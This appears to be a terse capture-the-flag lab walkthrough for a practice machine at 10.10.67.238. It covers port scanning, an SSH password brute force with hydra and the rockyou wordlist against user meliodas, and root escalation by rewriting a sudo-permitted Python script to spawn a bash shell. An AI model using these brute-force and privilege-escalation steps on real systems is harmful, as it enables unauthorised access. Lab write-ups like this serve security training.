nmap   
port 80, 22  
http://10.10.67.238/robots.txt  -> gives rockyou hint   . rockyou is associated with hydra brute force  
http://10.10.67.238/ -> we have a post by user meliodas   
## hydra  
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt  ssh://10.10.67.238  
We get a password for meliodas   
ssh  
we get the user flag  
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py  
change this file to   
#!/usr/bin/env python  
import pty  
pty.spawn("/bin/bash")  
sudo /usr/bin/python /home/meliodas/bak.py   
We get shell as root  
cat /root/root.txt  
